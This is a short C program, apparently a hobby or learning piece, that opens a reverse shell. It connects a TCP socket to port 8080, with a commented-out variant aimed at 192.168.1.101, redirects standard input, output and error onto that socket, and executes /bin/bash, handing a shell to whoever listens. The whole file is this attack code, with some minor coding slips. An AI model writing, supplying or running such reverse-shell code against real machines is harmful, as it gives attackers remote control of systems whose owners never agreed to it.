#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>


#define PORT 8080
// #define IP 
#define MAX 1024


int main() {
    int sockfd;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    // struct addrinfo hints, *res;
    // int status;
    // char inbuff[MAX];

    // memset(&hints, 0, sizeof hints);
    // hints.ai_family = AF_INET; // AF_INET or AF_INET6 to force version
    // hints.ai_socktype = SOCK_STREAM;
    

    // if ((status = getaddrinfo("192.168.1.101", "8080", &hints, &res)) != 0) {
    //   fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
    //   return 2;
    // }
    
    // int sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    // connect(sockfd,res->ai_addr,res->ai_addrlen);
 
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = INADDR_ANY;
    if(connect(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) {
        perror("connection failed");
        return 1;
    }
    int flags = fcntl(sockfd, F_GETFL, 0);
    flags |= O_NONBLOCK;
    fcntl(sockfd, F_SETFL, flags);
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    setbuf(stdout, NULL);
    char *const argv[] = {"/bin/bash", NULL};
    execve("/bin/bash", NULL, NULL);

}